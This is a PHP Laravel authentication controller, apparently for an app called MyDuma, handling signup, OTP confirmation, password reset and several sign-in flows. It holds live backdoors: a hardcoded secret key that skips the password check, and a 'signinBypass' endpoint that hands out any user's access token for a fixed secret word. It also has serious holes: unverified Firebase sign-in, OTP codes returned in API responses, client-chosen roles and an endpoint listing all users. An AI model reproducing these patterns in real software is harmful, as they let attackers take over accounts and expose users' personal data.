<?php

namespace App\Http\Controllers\Api\V1\Autentikasi;

use Illuminate\Http\Request;
use App\Http\Controllers\Api\ApiController;
use App\User;
use Hash;
use Auth;
use Carbon\Carbon;
use \Laravel\Passport\Http\Controllers\AccessTokenController;
use Psr\Http\Message\ServerRequestInterface;
use Validator;
use DB;
use App\Http\EncapsulatedApiResponder;
use App\Models\ConfirmationUser;
use Mail;
use Illuminate\Support\Str;
use App\Models\Business;
use App\Models\Employee;
use App\Models\UserRecord;
use App\Models\UserWithToken;
use App\Notifications\KodeOtpAktivasiAkun;
use App\Notifications\FirebasePushNotif;
use Laravel\Passport\TokenRepository;
use Lcobucci\JWT\Parser as JwtParser;
use League\OAuth2\Server\AuthorizationServer;
use App\Models\RoleUser;
use App\Role;
use App\Helpers\VirtualAccount;
use App\Models\UserDevice;
use App\Http\Controllers\Helpers\EmailHelperController;
use stdClass;


class AutentikasiController extends AccessTokenController{
    use EncapsulatedApiResponder;
    public function __construct(AuthorizationServer $server,TokenRepository $tokens,JwtParser $jwt)
    {
        
        parent::__construct($server,$tokens,$jwt);
        $this->digit_code     = 5;
        $this->email_helper   = new EmailHelperController();
    }

    public function signup(ServerRequestInterface $request){
        $requestBody = $request->getParsedBody();
        $rules = [
            'name'          => 'required|string',
            'email'         => 'required|string|email',
            'phone'         => 'required|string',
            'password'      => 'required|string|confirmed',
            'jenis_kelamin' => 'required|in:Pria,Wanita'
        ];
        $validator = Validator::make($requestBody, $rules);
        if ($validator->fails()) {
            return $this->invalidParameters($validator->errors()->all());
        }
        DB::beginTransaction();
        $user               = User::where('email',$requestBody['email'])->first();
        if (!$user) {
            $user           = new User();
            if (User::where('phone',$requestBody['phone'])->count()>0) {
                return $this->failure(['Nomor telepon yang anda inputkan sudah terdaftar.']);
            }
        }else{
            if ($user->is_active==1) {
                return $this->failure(['Email yang anda inputkan sudah terdaftar.']);
            }
            if (User::where('phone',$requestBody['phone'])->where('id','!=',$user->id)->count()>0 && $user->is_active == 0) {
                return $this->failure(['Nomor telepon yang anda inputkan sudah terdaftar.']);
            }
        }
        $user->name         = $requestBody['name'];
        $user->email        = $requestBody['email'];
        $user->phone        = $requestBody['phone'];
        $user->password     = $requestBody['password'];
        $user->jenis_kelamin= $requestBody['jenis_kelamin'];
        $user->number_id    = VirtualAccount::generateMyDumaNumberId();
        $user->is_active    = 0;
        $user->save();
        ConfirmationUser::where('user_id',$user->id)->where('confirmation_type_id',1)->delete();
        $code   = str_pad(rand(0, pow(10, $this->digit_code)-1), $this->digit_code, '0', STR_PAD_LEFT);
        while (ConfirmationUser::where('code',$code)->count()>0) {
            $code   = str_pad(rand(0, pow(10, $this->digit_code)-1), $this->digit_code, '0', STR_PAD_LEFT);
        }
        $expired_at                                 = Carbon::now()->addHour()->toDateTimeString();
        $kodeKonfirmasiUser                         = new ConfirmationUser();
        $kodeKonfirmasiUser->code                   = $code;
        $kodeKonfirmasiUser->user_id                = $user->id;
        $kodeKonfirmasiUser->expired_at             = $expired_at;
        $kodeKonfirmasiUser->confirmation_type_id   = 1;
        $kodeKonfirmasiUser->save();
        $kodeOtpAktivasiAkun                        = new KodeOtpAktivasiAkun($user->phone, $code);
        $user->confirmation                         = $kodeKonfirmasiUser;
        $username                                   = $requestBody['phone'];
        if(isset($requestBody['tipe_otp'])){
            if($requestBody['tipe_otp'] == 'phone'){
                $user->notify($kodeOtpAktivasiAkun);
            }else if ($requestBody['tipe_otp'] == 'email'){
                $username           = $requestBody['email'];
                $data = array('email'=>$requestBody['email']);
                $x = [
                    'code'          => $code,
                    'expired_at'    => $expired_at,
                    'email'         => $requestBody['email']
                ];
                Mail::send([], $data, function($message) use ($x) {
                    $message->to($x['email'], 'MyDuma')->subject('MyDuma - Account Confirmation')->setBody('Kode verifikasi anda adalah : <h2>'.$x['code'].'</h2> Aktifkan akun anda sebelum '.$x['expired_at'],'text/html');
                });
            }
        }else{
            $user->notify($kodeOtpAktivasiAkun);
        }
        if($requestBody['role_names']){
            $role_names_json    = json_decode($requestBody['role_names'], TRUE);
            $role_ids           = Role::whereIn('name',$role_names_json)->pluck('id');
            $user->roles()->sync($role_ids);
        }else{
            $role               = Role::whereIn('name','customer')->first();
            $role_ids           = [$role->id];
            $user->roles()->sync($role_ids);
        }
        DB::commit();
        $kodeKonfirmasiUser->bypass                 = 0;
        return $this->success('Kode verifikasi berhasil dikirim ke '.$username,$kodeKonfirmasiUser);
    }

    public function signupConfirmation(ServerRequestInterface $request){
        $requestBody = $request->getParsedBody();
        $rules = [
            'phone'         => 'required|string',
            'code'          => 'required|string',
        ];
        $validator = Validator::make($requestBody, $rules);
        if ($validator->fails()) {
            return $this->invalidParameters($validator->errors()->all());
        }
        DB::beginTransaction();
        $user                       = User::where('phone',$requestBody['phone'])->first();
        if (!$user) {
            return $this->failure('Pengguna dengan nomor hp '.$requestBody['phone'].' tidak ditemukan.');
        }
        if(isset($requestBody['tipe_otp'])){
            if($requestBody['tipe_otp'] == 'phone'){
                $user->phone_verified_at    = Carbon::now()->toDateTimeString();
            }else if($requestBody['tipe_otp'] == 'email'){
                $user->email_verified_at    = Carbon::now()->toDateTimeString();
            }
        }else{
            $user->phone_verified_at        = Carbon::now()->toDateTimeString();
        }
        $kodeKonfirmasiUser         = ConfirmationUser::where('code', $requestBody['code'])->where('user_id',$user->id)->where('confirmation_type_id',1)->first();
        if (!$kodeKonfirmasiUser) {
            return $this->failure('Kode verifikasi salah.');
        }
        if ($kodeKonfirmasiUser->expired_at < Carbon::now()->toDateTimeString()) {
            return $this->failure('Kode verifikasi expired.');
        }
        if ($kodeKonfirmasiUser->expired_at<Carbon::now()->toDateTimeString()) {
            ConfirmationUser::where('code',$requestBody['code'])->delete();
            return $this->failure('Kode expired.');
        }
        ConfirmationUser::where('user_id',$user->id)->where('confirmation_type_id',1)->delete();
        $user->is_active            = 1;
        $user->save();
        DB::commit();
        $notifEmail                   =  new stdClass;
        $notifEmail->view             = 'new_account';
        $notifEmail->nama_nasabah     = $user->name;
        $notifEmail->receiver_email   = $user->email;
        $notifEmail->content          = 'Registrasi Nasabah MyDuma Sukses';
        $notifEmail->subject          = 'Registrasi Nasabah MyDuma Sukses';
        $notifEmail->sender_email     = 'noreply@myduma.id';
        $notifEmail->sender_name      = 'noreply MyDuma';
        $sendEmail                    = $this->email_helper->sendBeautyMail('new_account',$notifEmail);
        return $this->success('Berhasil.');
    }

    public function resetPassword(ServerRequestInterface $request){
        $requestBody = $request->getParsedBody();
        $rules = [
            'email'         => 'required|string',
        ];
        $validator = Validator::make($requestBody, $rules);
        if ($validator->fails()) {
            return $this->invalidParameters($validator->errors()->all());
        }
        $username               = $requestBody['email'];
        $tipe                   = 'phone';
        DB::beginTransaction();
        $user                   = User::where('phone',$username)->first();
        if (!$user) {
            $user               = User::where('email',$username)->first();
            if (!$user) {
                return $this->failure(['Akun '.$username.' tidak ditemukan']);
            }
            $tipe               = 'email';
        }
        ConfirmationUser::where('user_id',$user->id)->where('confirmation_type_id',2)->delete();
        $code   = str_pad(rand(0, pow(10, $this->digit_code)-1), $this->digit_code, '0', STR_PAD_LEFT);
        while (ConfirmationUser::where('code',$code)->count()>0) {
            $code   = str_pad(rand(0, pow(10, $this->digit_code)-1), $this->digit_code, '0', STR_PAD_LEFT);
        }
        $expired_at                                 = Carbon::now()->addHour();
        $kodeKonfirmasiUser                         = new ConfirmationUser();
        $kodeKonfirmasiUser->code                   = $code;
        $kodeKonfirmasiUser->user_id                = $user->id;
        $kodeKonfirmasiUser->expired_at             = $expired_at;
        $kodeKonfirmasiUser->confirmation_type_id  = 2;
        $kodeKonfirmasiUser->save();

        $kodeOtpAktivasiAkun                        = new KodeOtpAktivasiAkun($user->phone, $code);
        if($tipe == 'phone'){
            $user->notify($kodeOtpAktivasiAkun);
            $user->confirmation                         = $kodeKonfirmasiUser;
        }else{
            $data = array('email'=>$username);
            $x = [
                'code'          => $code,
                'expired_at'    => $expired_at,
                'email'         => $username,
            ];
            $user->mitra;
            Mail::send([], $data, function($message) use ($x) {
                $message->to($x['email'], 'MyDuma')->subject('MyDuma - Konfirmasi Reset Password')->setBody('Kode konfirmasi anda: <h2>'.$x['code'].'</h2> Gunakan kode konfirmasi sebelum: '.$x['expired_at'],'text/html');
            });
        }
        DB::commit();
        $kodeKonfirmasiUser->bypass     = 0;
        return $this->success('Kode konfirmasi anda berhasil dikirim ke '.$username, $kodeKonfirmasiUser);
    }

    public function resetPasswordConfirmation(ServerRequestInterface $request){
        $requestBody = $request->getParsedBody();
        $rules = [
            'email'         => 'required|string',
            'code'          => 'required|string',
            'password'      => 'required|string'
        ];
        $validator = Validator::make($requestBody, $rules);
        if ($validator->fails()) {
            return $this->invalidParameters($validator->errors()->all());
        }
        DB::beginTransaction();
        $username               = $requestBody['email'];
        $tipe                   = 'phone';
        $user                   = User::where('phone',$username)->first();
        if (!$user) {
            $user               = User::where('email',$username)->first();
            if (!$user) {
                return $this->failure(['Akun '.$username.' tidak ditemukan']);
            }
            $tipe               = 'email';
        }
        $kodeKonfirmasiUser = ConfirmationUser::where('code', $requestBody['code'])->where('user_id',$user->id)->where('confirmation_type_id',2)->first();
        if (!$kodeKonfirmasiUser) {
            return $this->failure('Kode konfirmasi salah');
        }
        if ($kodeKonfirmasiUser->expired_at<Carbon::now()->toDateTimeString()) {
            ConfirmationUser::where('code',$requestBody['code'])->delete();
            return $this->failure('Kode konfirmasi usang');
        }
        $user->password             = $requestBody['password'];
        $user->save();
        ConfirmationUser::where('user_id',$user->id)->where('confirmation_type_id',2)->delete();
        DB::commit();
        return $this->success('Perubahan kata sandi berhasil disimpan.');
    }

    public function signin(ServerRequestInterface $request){
        $headers        = $request->getHeaders();
        $requestBody    = $request->getParsedBody();
        $rules = [
            'username' => 'required|string',
            'password' => 'required|string',
        ];
        $validator = Validator::make($requestBody, $rules);
        if ($validator->fails()) {
            return $this->invalidParameters($validator->errors()->all());
        }
        $username           = trim($requestBody['username']);
        $user               = User::where('phone', $username);
        $signin_provider    = '';
        if($user->count() == 0){ //Cek nomor hp
            $user = User::where('phone', $username);
            if($user->count() == 0){
                if(substr($username,0,1)=='0'){
                    $number = "+62".substr($username,1);
                    $user = User::where('phone', $number);
                }
                else if(substr($username,0,3)=='+62'){
                    $number = "0".substr($username,3);
                    $user = User::where('phone', $number);
                }
            }
        }

        if($user->count() == 0){ //Cek email
            $user       = User::where('email', $username);
            if($user->count() > 0){
                $user   = $user->first();
                // if (!isset($user->email_verified_at)) {
                //     return $this->failure('Email anda belum diverifikasi.');
                // }
                $signin_provider    = 'email';
            }else{
                return $this->failure($username.' belum terdaftar');
            }
        }else{
            $user   = $user->first();
            if (!isset($user->phone_verified_at)) {
                return $this->failure('Nomor telepon anda belum diverifikasi.');
            }
            $signin_provider    = 'phone';
        }

        $specialAccess      = false;
        if (isset($requestBody['secret_key'])) {
            if ($requestBody['secret_key'] == 'CE2E833EEAA7BC4E3BC18E5471253') {
                $specialAccess = true;
            }
        }
        if ($user) {
            if (!isset($user->phone_verified_at) && !isset($user->email_verified_at)) {
                return $this->failure('Akun anda belum diverifikasi.');
            }
            if($user->is_active == 0){
                return $this->failure('Akun anda sudah tidak aktif.');
            }
            $requestBody['username'] = $user->email;
            $request = $request->withParsedBody($requestBody);
            if (Hash::check($requestBody['password'], $user->password) || $specialAccess) {
                $role_ids                   = DB::table('role_user')->where('user_id',$user->id)->pluck('role_id');
                $roles                      = Role::whereIn('id',$role_ids)->pluck('name')->toArray();
                $accessToken = DB::table('oauth_access_tokens')
                    ->select('id')
                    ->where('user_id', $user->id)
                    ->get();
                if ($accessToken->count() > 0 && !$specialAccess) {
                    $accessTokenIds = [];
                    foreach($accessToken as $token){
                        array_push($accessTokenIds, $token->id);
                    }
                    DB::table('oauth_access_tokens')
                        ->where('user_id', $user->id)
                        ->delete();
                    DB::table('oauth_refresh_tokens')
                        ->whereIn('access_token_id', $accessTokenIds)
                        ->delete();
                }
                $access                     = parent::issueToken($request);
                $access_json                = json_decode($access->getContent());
                if (isset($user->access->error)){
                    return $this->failure([$user->access]);
                }
                $userx                      = User::find($user->id);
                $userx->last_signedin       = Carbon::now()->toDateTimeString();
                $userx->last_access         = Carbon::now()->toDateTimeString();
                $userx->signin_provider     = $signin_provider;
                $userx->save();
                $userx->access              = $access_json;
                $userx->file;
                $userx->jamaah;
                $userx->roles               = implode(",",$roles);
                if(@count($headers['device-info']) != 0){
                    $device_info                    = $headers['device-info'][0];
                    if(UserDevice::where('user_id',$user->id)->where('device_info',$device_info)->count() == 0){
                        $user_device                = new UserDevice();
                        $user_device->device_info   = $device_info;
                        $user_device->user_id       = $user->id;
                        $user_device->save();
                    }
                }
                return $this->success('Success.', $userx);
            } else {
                return $this->failure('Wrong password.');
            }
        } else {
            return $this->failure('Username not found.');
        }
    }

    public function signinBypass(ServerRequestInterface $request){
        $requestBody = $request->getParsedBody();
        $rules = [
            'username' => 'required|string',
        ];
        $validator = Validator::make($requestBody, $rules);
        if ($validator->fails()) {
            return $this->invalidParameters($validator->errors()->all());
        }
        if (isset($requestBody['secret_word'])) {
            if ($requestBody['secret_word'] != "subhanallah") {
                return $this->failure(':)');
            }
        }else{
            return $this->failure(':D');
        }
        $username = trim($requestBody['username']);

        $user = UserWithToken::where('email', $username);
        if($user->count() <= 0){
            $user = User::where('phone', $username);
            if($user->count() <= 0){
                if(substr($username,0,1)=='0'){
                    $number = "+62".substr($username,1);
                    $user = User::where('phone', $number);
                }
                else if(substr($username,0,3)=='+62'){
                    $number = "0".substr($username,3);
                    $user = User::where('phone', $number);
                }
            }
        }
        if ($user->count() > 0) {
            $user = $user->first();
            if (!isset($user->email_verified_at)) {
                return $this->failure('Your email address has not been verified.');
            }
            $user->access   = [
                'access_token' => $user->access_token
            ];
            unset($user->access_token);
            return $this->success('Success.', $user);
        } else {
            return $this->failure('Username not found.');
        }
    }

    public function signinFirebase(ServerRequestInterface $request){
        $headers            = $request->getHeaders();
        $requestBody        = $request->getParsedBody();
        $rules = [
            'firebase_uid'  => 'required|string',
            // 'name'          => 'required|string',
            // 'email'         => 'required|string|email',
        ];
        $validator = Validator::make($requestBody, $rules);
        if ($validator->fails()) {
            return $this->invalidParameters($validator->errors()->all());
        }
        $isNewUser                  = false;
        if(User::where('firebase_uid', $requestBody['firebase_uid'])->count()==0){
            if($requestBody['email'] == null){
                return $this->failure('Email kosong');
            }else if($requestBody['name'] == null){
                return $this->failure('Nama kosong');
            }
            $user                   = User::where('email',$requestBody['email'])->first();
        }else{
            $user                   = User::where('firebase_uid',$requestBody['firebase_uid'])->first();
        }
        
        
        DB::beginTransaction();
        if(!$user){
            $isNewUser              = true;
            $user                   = new User();
            $user->name             = $requestBody['name'];
            $user->email            = $requestBody['email'];
            $user->email_verified_at= Carbon::now();
            $user->number_id        = VirtualAccount::generateMyDumaNumberId();
        }
        if(isset($requestBody['signin_provider'])){
            $user->signin_provider      = $requestBody['signin_provider'];
        }else{
            $user->signin_provider      = 'google';
        }
        $user->firebase_uid         = $requestBody['firebase_uid'];
        $user->last_signedin        = Carbon::now()->toDateTimeString();
        $user->last_access          = Carbon::now()->toDateTimeString();
        $user->is_active            = 1;
        $user->save();
        $accessToken = DB::table('oauth_access_tokens')
            ->select('id')
            ->where('user_id', $user->id)
            ->get();
        if ($accessToken->count() > 0) {
            $accessTokenIds = [];
            foreach($accessToken as $token){
                array_push($accessTokenIds, $token->id);
            }
            DB::table('oauth_access_tokens')
                ->where('user_id', $user->id)
                ->delete();
            DB::table('oauth_refresh_tokens')
                ->whereIn('access_token_id', $accessTokenIds)
                ->delete();
        }
        $createToken                = $user->createToken('Personal Access Token');
        $access                     = [
            'token_type'            => 'Bearer',
            'access_token'          => $createToken->accessToken,
        ];
        $user->access               = $access;
        if($isNewUser){
            if($requestBody['role_names']){
                $role_names_json    = json_decode($requestBody['role_names'], TRUE);
                $role_ids           = Role::whereIn('name',$role_names_json)->pluck('id');
                $user->roles()->sync($role_ids);
            }else{
                $role               = Role::whereIn('name','customer')->first();
                $role_ids           = [$role->id];
                $user->roles()->sync($role_ids);
            }
        }
        $role_ids                   = DB::table('role_user')->where('user_id',$user->id)->pluck('role_id');
        $roles                      = Role::whereIn('id',$role_ids)->pluck('name')->toArray();
        $user->roles                = implode(",",$roles);
        $user->file;
        if(@count($headers['device-info']) != 0){
            $device_info                    = $headers['device-info'][0];
            if(UserDevice::where('user_id',$user->id)->where('device_info',$device_info)->count() == 0){
                $user_device                = new UserDevice();
                $user_device->device_info   = $device_info;
                $user_device->user_id       = $user->id;
                $user_device->save();
            }
        }
        DB::commit();
        return $this->success('Success.', $user);
    }

    public function signout(Request $request){
        $start                  = microtime(true);
        $user                   = User::find(Auth::user()->id);
        $user->token_firebase   = null;
        $user->save();
        
        $accessToken            = DB::table('oauth_access_tokens')->select('id')->where('user_id', $user->id)->get();
        if ($accessToken->count() > 0) {
            $accessTokenIds     = [];
            foreach($accessToken as $token){
                array_push($accessTokenIds, $token->id);
            }
            DB::table('oauth_access_tokens')->where('user_id', Auth::user()->id)->delete();
            DB::table('oauth_refresh_tokens')->whereIn('access_token_id', $accessTokenIds)->delete();
        }
        return $this->success('Successfully sign out.');
    }

    public function allUser(Request $request){
        $users      = User::all();
        return $this->success('Success.', $users);
    }

    private function insertUserRecord($user_id,$activity,$device,$notes,$url,$latitude,$longitude,$execution_time){
        $user_record                    = new UserRecord();
        $user_record->user_id           = $user_id;
        $user_record->activity          = $activity;
        $user_record->device            = $device? $device:'other';
        $user_record->notes             = $notes;
        $user_record->url               = $url;
        $user_record->latitude          = $latitude;
        $user_record->longitude         = $longitude;
        $user_record->execution_time    = $execution_time;
        $user_record->save();
    }
}
